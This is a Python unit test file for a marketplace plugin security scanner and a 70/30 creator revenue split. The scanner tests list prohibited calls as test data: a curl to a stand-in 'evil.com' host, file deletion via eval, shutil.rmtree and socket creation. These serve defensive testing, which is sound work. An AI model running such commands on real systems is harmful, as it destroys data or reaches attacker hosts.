"""Unit tests for Marketplace Security Verifier and Creator Revenue Split (Spec 12 §2, §4)."""

from decimal import Decimal
import pytest

from atlas_api.modules.marketplace.domain.verifier import (
    calculate_creator_revenue_split,
    scan_plugin_code_security,
)


def test_scan_plugin_code_security_allows_safe_code() -> None:
    safe_code = """
import math

def calculate_signal(prices):
    sma = sum(prices) / len(prices)
    return "BUY" if prices[-1] > sma else "SELL"
"""
    is_safe, error = scan_plugin_code_security(safe_code)
    assert is_safe is True
    assert error is None


@pytest.mark.parametrize(
    "prohibited_call",
    [
        "import os; os.system('curl evil.com')",
        "import subprocess; subprocess.run(['ls', '-la'])",
        "eval('__import__(\"os\").remove(\"file.txt\")')",
        "exec('print(1)')",
        "import socket; s = socket.socket()",
        "shutil.rmtree('/tmp')",
    ],
)
def test_scan_plugin_code_security_vetoes_prohibited_calls(prohibited_call: str) -> None:
    is_safe, error = scan_plugin_code_security(prohibited_call)
    assert is_safe is False
    assert error is not None
    assert "SECURITY_VETO" in error


def test_calculate_creator_revenue_split_70_30() -> None:
    gross = Decimal("100.00")
    creator_share, platform_share = calculate_creator_revenue_split(gross)

    assert creator_share == Decimal("70.00")
    assert platform_share == Decimal("30.00")
    assert creator_share + platform_share == gross


def test_calculate_creator_revenue_split_odd_amount() -> None:
    gross = Decimal("49.00")
    creator_share, platform_share = calculate_creator_revenue_split(gross)

    assert creator_share == Decimal("34.30")
    assert platform_share == Decimal("14.70")
    assert creator_share + platform_share == gross


def test_calculate_creator_revenue_split_zero_amount() -> None:
    gross = Decimal("0.00")
    creator_share, platform_share = calculate_creator_revenue_split(gross)

    assert creator_share == Decimal("0.00")
    assert platform_share == Decimal("0.00")
    assert creator_share + platform_share == gross
